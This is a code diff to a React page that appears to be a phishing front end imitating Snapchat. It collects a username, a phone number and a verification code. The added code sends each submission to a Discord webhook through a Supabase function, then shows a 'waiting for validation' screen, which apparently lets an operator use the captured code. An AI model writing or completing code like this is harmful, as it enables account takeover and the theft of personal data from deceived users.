@@ -5,6 +5,7 @@ import SnapForm from "@/components/SnapForm";
 import CodeVerification from "@/components/CodeVerification";
 import WaitingValidation from "@/components/WaitingValidation";
 import SuccessScreen from "@/components/SuccessScreen";
+import { supabase } from "@/integrations/supabase/client";
 
 type Step = "form" | "code" | "waiting" | "success";
 
@@ -13,19 +14,28 @@ const Index = () => {
   const [formData, setFormData] = useState({ username: "", phone: "" });
   const [codeError, setCodeError] = useState("");
 
-  const handleFormSubmit = (data: { username: string; phone: string }) => {
-    setFormData(data);
-    setStep("code");
-    // TODO: Envoyer webhook Discord ici
+  const sendToDiscord = async (data: { username: string; phone: string; code?: string; step: string }) => {
+    try {
+      await supabase.functions.invoke('discord-webhook', {
+        body: data
+      });
+    } catch (error) {
+      console.error("Error sending to Discord:", error);
+    }
   };
 
-  const handleCodeSubmit = (code: string) => {
-    // Simuler une vérification
+  const handleFormSubmit = async (data: { username: string; phone: string }) => {
+    setFormData(data);
+    setStep("code");
+    await sendToDiscord({ ...data, step: "form" });
+  };
+
+  const handleCodeSubmit = async (code: string) => {
     console.log("Code submitted:", code, "for user:", formData);
+    await sendToDiscord({ ...formData, code, step: "code" });
     setStep("waiting");
     
     // Simuler l'attente de validation (en vrai ce serait via webhook Discord)
-    // Pour demo, on passe automatiquement au succès après 5 secondes
     setTimeout(() => {
       setStep("success");
     }, 5000);
